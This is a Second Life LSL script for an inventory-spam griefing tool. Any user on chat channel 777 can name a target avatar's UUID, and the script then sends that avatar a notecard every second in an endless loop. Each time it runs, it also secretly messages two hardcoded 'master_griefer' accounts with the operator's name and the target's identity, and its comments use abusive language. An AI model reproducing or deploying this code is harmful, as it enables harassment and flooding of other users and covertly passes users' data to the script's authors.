// TEST UUIDS
// e644cad2-7693-47b3-ade5-e892fb948712 - piol0

// TO-DO: CONSTANT MASTER KEY LIST OF SECURITY IDs
key master_griefer1 = "854dba6c-0692-481b-bb5b-90bc0d121d91"; // b
key master_griefer2 = "8ee744e3-58d2-42a3-a8c9-663f2e1b0769"; // t

// INTERFACE VARIABLES
integer gListener_menu;
string owner = "unknown";

// SERVICE FUNCTIONS
loop_spam(key user)
{
    while(1)
    {
        llGiveInventory(user, llGetInventoryName(INVENTORY_NOTECARD, 0) );
        llSleep(1.0);
    }    
}

// CONTROLLER
default
{
    state_entry()
    {   
        // get owner name for notification purposes
        owner = (string)llKey2Name(llGetOwner());
        
        // listen to /666 start cmd & display menu from anyone
        gListener_menu = llListen( 777, "", NULL_KEY, "");  
    }
    
    listen(integer channel, string name, key id, string message)
    {
            // convert uuid key to name & notify griefers
            string target_name = llKey2Name(message);
            string target_username = llGetDisplayName(message);
            
            if(target_name == NULL_KEY || target_name == "")
            {
                llInstantMessage(master_griefer1, "uuid is invalid. please check and try again, bitch.");
                llInstantMessage(master_griefer2, "uuid is invalid. please check and try again, bitch.");
            }
            else
            {
                // notify authorized griefers
                llInstantMessage(master_griefer1,">>> log: "+ owner +" initiated impacto spammer <<<\n>>> target uuid: " + message + " <<<\n>>> target name: " + target_name + " | " + target_username +" <<<");
                llInstantMessage(master_griefer2,">>> log: "+ owner +" initiated impacto spammer <<<\n>>> target uuid: " + message + " <<<\n>>> target name: " + target_name + " | " + target_username +" <<<");
                // start spammer
                loop_spam(message);
            }
    }
    
    changed(integer mask)
    {   // triggered when the object containing this script changes owner
        if(mask & CHANGED_OWNER)
        {
            // reset script when there's a new owner
            llResetScript();  
        }
    }
    
}
